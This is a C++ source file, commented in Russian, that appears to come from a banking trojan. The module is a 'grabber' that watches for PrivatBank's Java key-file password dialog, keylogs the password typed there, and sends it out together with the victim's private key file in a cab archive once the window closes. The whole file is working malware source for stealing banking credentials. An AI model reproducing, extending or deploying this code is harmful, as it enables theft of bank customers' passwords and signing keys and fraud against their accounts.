
#pragma hdrstop

#include "PrivatBankKeyPass.h"
#include "JavaAppletGrabbers.h"
#include "WndUtils.h"
#include "UniversalKeyLogger.h"
#include "Strings.h"
#include "Utils.h"
#include "StrConsts.h"
//---------------------------------------------------------------------------


#include "BotDebug.h"

namespace PPRIVATDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define PRVDBG PPRIVATDEBUGSTRINGS::DBGOutMessage<>


namespace  PrivatBankKeyPass
{


	const static char* PrivatBankKeyPassWndMask = "Файл ключей*";


	// Динамические данные
	DWORD PID = 0;
	TPrivatBankKeyPassword *Grabber = NULL;
	//------------------------------------------------


	//------------------------------------------------
	//  ShowWndHandler - обрабатываем событие закрытия
	//                   окна
	//------------------------------------------------
	void WINAPI ShowWndHandler(PKeyLogger, DWORD, LPVOID Data)
	{
		if (!Grabber) return;

		PShowWindowData SW = (PShowWindowData)Data;

		if (SW->Command == SW_HIDE && SW->Window == Grabber->Wnd())
		{
			// При закрытии окна отправляем лог
			Grabber->SendLog();
			delete Grabber;
			Grabber = NULL;
            KeyLogger::DisconnectEventHandler(KLE_SHOW_WND, ShowWndHandler);
		}
	}



}



//------------------------------------------------
//  Initialize - Функция инициализирует грабер
//				 пароля ключа приватбанка
//------------------------------------------------
bool PrivatBankKeyPass::Initialize(HWND Wnd, DWORD  WndClassHash)
{
	if (WndClassHash != JAVAWND_SUNAWTDIALOG)
		return false;

	// Определяем текст окна
	string Text = GetWndText(Wnd);
	if (!WildCmp(Text.t_str(), PrivatBankKeyPassWndMask))
		return false;

	if (IsNewProcess(PID))
	{
		// Инициализируем данны в новом процессе
    	Grabber = NULL;
    }

	if (!Grabber)
	{
		PRVDBG("PrivatKeyPass", "Грабер пароля ключа приватбанка инициализирован");

		Grabber = new TPrivatBankKeyPassword(Wnd, Text);

		// Подключаемся к событиям отображения окна
		// для отправки лога при попытке закрыть окно
		KeyLogger::ConnectEventHandler(KLE_SHOW_WND, ShowWndHandler);
	}

	return true;
}




//*****************************************************
//  Грабер пароля ключа приватбанка
//*****************************************************

TPrivatBankKeyPassword::TPrivatBankKeyPassword(HWND aWnd, const string& WndText)
	: TGrabber(GetStr(EStrPrivatBankKeyPasswordGrabber))
{
	FWnd = aWnd;
	ConnectToKeyLogger();
	ParseFileName(WndText);
}

TPrivatBankKeyPassword::~TPrivatBankKeyPassword()
{

}

//------------------------------------------
//  Функция сохранет лог клавиатуры
//------------------------------------------
void TPrivatBankKeyPassword::LogKeyboad(HWND aWnd, const char* Text)
{
	if (aWnd == FWnd)
		FPassword += Text;
}


//------------------------------------------
//  Функция отправляет лог
//------------------------------------------
bool TPrivatBankKeyPassword::SendLog()
{
	PRVDBG("PrivatKeyPass", "Отправляем лог\rPassword=%s", FPassword.t_str());
	if (FPassword.IsEmpty()) return false;

	LPVOID Cab = OpenCab();
	if (!Cab) return false;

	TBotStrings Fields;
	Fields.ValueDelimeter = ": ";
	Fields.AddValue(GetStr(EStrLogFieldPassword), FPassword);

	AddStringToCab(Cab, Fields.GetText(), GetStr(StrLogFileInformation));

	// Добавляем файл ключа
	if (!FKeyFileName.IsEmpty())
	{
		string ShortName = GetStr(EStrLogKeyPath);
		ShortName += Slash;
		ShortName += File::ExtractFileNameA(FKeyFileName.t_str(), false);
		AddFileToCab(Cab, FKeyFileName.t_str(), ShortName.t_str());
	}

	// Закрываем каб и отправляем лог
	CloseCab(true);

	return true;
}

//------------------------------------------
//  Функция разбирает заколовок окна
//  в поисках имени файла ключа
//------------------------------------------
void TPrivatBankKeyPassword::ParseFileName(const string& Text)
{
	PCHAR File = STRA::Scan(Text.t_str(), '"');
	if (!File) return;
	File++;
	PCHAR End = STRA::Scan(File, '"');
	if (!End) return;
	*End = 0;
	if (File::IsExists(File))
		FKeyFileName = File;
}
